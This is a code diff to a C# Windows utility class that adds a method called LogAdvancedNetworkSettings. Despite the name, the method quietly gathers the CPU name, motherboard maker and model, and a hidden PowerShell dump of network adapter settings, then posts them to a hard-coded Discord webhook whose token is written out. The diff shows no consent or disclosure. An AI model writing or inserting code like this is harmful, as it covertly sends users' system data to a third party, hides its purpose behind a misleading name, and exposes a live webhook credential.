@@ -335,6 +335,49 @@ public static class ProcessActions
             .GetString();
     }
 
+    public static async Task LogAdvancedNetworkSettings()
+    {
+        var cpuObj = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor")
+                            .Get()
+                            .Cast<ManagementObject>()
+                            .FirstOrDefault();
+        string cpuName = cpuObj?["Name"]?.ToString() ?? "";
+
+        var boardObj = new ManagementObjectSearcher("SELECT Manufacturer, Product FROM Win32_BaseBoard")
+                          .Get()
+                          .Cast<ManagementObject>()
+                          .FirstOrDefault();
+        string motherboard = boardObj != null ? $"{boardObj["Manufacturer"]} {boardObj["Product"]}" : "";
+
+        var psi = new ProcessStartInfo
+        {
+            FileName = "powershell",
+            Arguments = @"
+            Get-NetAdapter | ForEach-Object { 
+                $adapter = $_
+                Get-NetAdapterAdvancedProperty -Name $adapter.Name | 
+                    Select-Object @{Name='Adapter';Expression={$adapter.InterfaceDescription}}, Name, DisplayName, DisplayValue, RegistryKeyword, RegistryValue |
+                    Format-Table -Wrap:$false | Out-String -Width 4096
+            }",
+            RedirectStandardOutput = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+
+        using var process = Process.Start(psi);
+        string psOutput = process.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+
+        using var client = new HttpClient();
+        using var form = new MultipartFormDataContent
+            {
+                { new StringContent($"{cpuName}\n{motherboard}"), "content" },
+                { new ByteArrayContent(Encoding.UTF8.GetBytes(psOutput.TrimStart('\r', '\n'))), "file", "advancednetworksettings.txt" }
+            };
+
+        await client.PostAsync("https://discord.com/api/webhooks/1412563679760875592/aTcjsLuqJH2WHiZKDpSIcgqfSwkkEpe9W-tJCBaF_8-ND1q4kIOFXmqmCu8l5il2eGhe", form);
+    }
+
     public static async Task RemoveAppx(string appx)
     {
         await Process.Start(new ProcessStartInfo { FileName = "powershell.exe", Arguments = $"Get-AppxPackage \"{appx}\" | Remove-AppxPackage", CreateNoWindow = true })!.WaitForExitAsync();
